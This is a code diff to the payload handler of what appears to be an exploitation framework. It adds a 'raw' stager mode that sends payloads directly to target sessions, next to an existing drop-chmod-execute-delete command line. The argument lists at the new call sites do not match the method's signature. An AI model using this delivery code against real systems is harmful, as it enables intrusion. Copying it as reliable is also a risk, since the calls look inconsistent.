@@ -188,6 +188,12 @@ class Handler(Server):
 
         sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
 
+    def raw_stage(self, payload, sender, args=[]):
+        self.badges.print_process("Sending payload stage...")
+        self.badges.print_process("Executing payload...")
+
+        sender(*args, payload)
+
     def set_session_details(self, payload, session):
         if not session.details['Type']:
             session.details['Type'] = 'custom'
@@ -222,7 +228,22 @@ class Handler(Server):
         if sender is not None:
             session = payload['Session'] if payload['Session'] is not None else HatSploitSession
             if payload['Category'].lower() == 'stager':
-                if post.lower() == 'printf':
+                if post.lower() == 'raw':
+                    self.do_job(
+                        "Handler raw Stage",
+                        payload,
+                        self.raw_stage,
+                        [
+                            payload['Raw'],
+                            sender,
+                            args,
+                            payload['Args'],
+                            delim,
+                            location,
+                            linemax
+                        ]
+                    )
+                elif post.lower() == 'printf':
                     self.do_job(
                         "Handler printf Stage",
                         payload,
@@ -308,7 +329,19 @@ class Handler(Server):
                         return False
 
                 if payload['Category'].lower() == 'stager':
-                    if post.lower() == 'printf':
+                    if post.lower() == 'raw':
+                        self.do_job(
+                            "Handler raw Stage",
+                            payload,
+                            self.raw_stage,
+                            [
+                                payload['Raw'],
+                                sender,
+                                args,
+                                payload['Args']
+                            ]
+                        )
+                    elif post.lower() == 'printf':
                         self.do_job(
                             "Handler printf Stage",
                             payload,
